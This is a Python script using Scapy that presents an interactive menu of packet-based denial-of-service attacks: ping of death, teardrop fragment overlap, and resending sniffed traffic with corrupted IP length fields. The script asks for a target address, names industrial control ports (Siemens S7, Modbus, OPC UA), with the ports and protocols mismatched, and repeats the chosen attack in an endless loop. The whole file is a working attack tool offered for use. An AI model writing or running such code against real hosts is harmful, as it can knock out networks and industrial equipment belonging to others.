import random
from scapy.all import *
from time import sleep
import nmap

src_ip = ""



def ping_of_death(ip_target):
    send(fragment(IP(dst=ip_target)/ICMP()/("X"*60000)))

def teardop(ip_target):
    send(IP(dst=ip_target, id=42, flags="MF")/UDP()/("X"*10))
    send(IP(dst=ip_target, id=42, flags=48)/UDP()/("X"*116))
    send(IP(dst=ip_target, id=42, flags="MF")/UDP()/("X"*224))

def malform_packet(pkt):
     print(str(pkt.show()))
     pkt[IP].len = random.randint(9,pkt[IP].len)
     sendp(pkt)
    
def ip_layer_malformed_packet(ip_target,port_target):
    sniff(iface="eth0",filter="ip dst host {}".format(ip_target),prn=malform_packet)

def select_attack():
    port_target = ""
    print("Select which kind of attack would you like to make:\n 1)Ping of the death\n 2)Teardop Attack\n 3)Generic TCP Malformed Messages ")
    attack=input("Option:")
    ip_target = input("Introduce IP target: ")
    if attack == "3":
        port_target = int(input("Introduce avaliable port(S7:102,OPC:502 ,Modbus:4840)"))
    return attack, port_target,ip_target




print("Welcome to malformed attacks menu by Sergio")

attack, port_target, ip_target = select_attack()

while True:
    try:
        if attack == "1":
            ping_of_death(ip_target)
        elif attack == "2":
            teardop(ip_target)
        elif attack == "3":
            ip_layer_malformed_packet(ip_target,port_target)
        else:
            "No option allowed"
            raise(KeyboardInterrupt)

    except KeyboardInterrupt:
        option = input("Do you want to finish(F) or change attack(C):")
        if option == "C" or option == "c":
            attack, port_target, ip_target = select_attack()
        else:
            exit()


